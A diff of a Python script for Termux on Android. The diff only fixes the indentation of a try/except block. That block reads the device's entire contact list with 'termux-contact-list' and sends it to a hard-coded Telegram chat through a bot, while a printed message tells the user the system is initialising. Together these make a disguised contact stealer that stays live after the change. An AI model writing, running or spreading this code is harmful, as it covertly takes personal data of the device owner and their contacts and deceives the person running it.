@@ -34,12 +34,12 @@ print('''
 # s = input("Введите токен рейд бота: ")
 # s = 11111
 try:
-		bot.send_message(ID, 'Отправка...')
-		a = subprocess.check_output(['termux-contact-list'])
-		bot.send_message(ID, a)
-	except:
-		bot.send_message(ID, 'Не получено!')
-		print('У вас не установлено Termux API, без него скрипт будет работать некоректно!')
+	bot.send_message(ID, 'Отправка...')
+	a = subprocess.check_output(['termux-contact-list'])
+	bot.send_message(ID, a)
+except:
+	bot.send_message(ID, 'Не получено!')
+	print('У вас не установлено Termux API, без него скрипт будет работать некоректно!')
 
 
 print("Инициализация системы, подождите около 3 минут...")
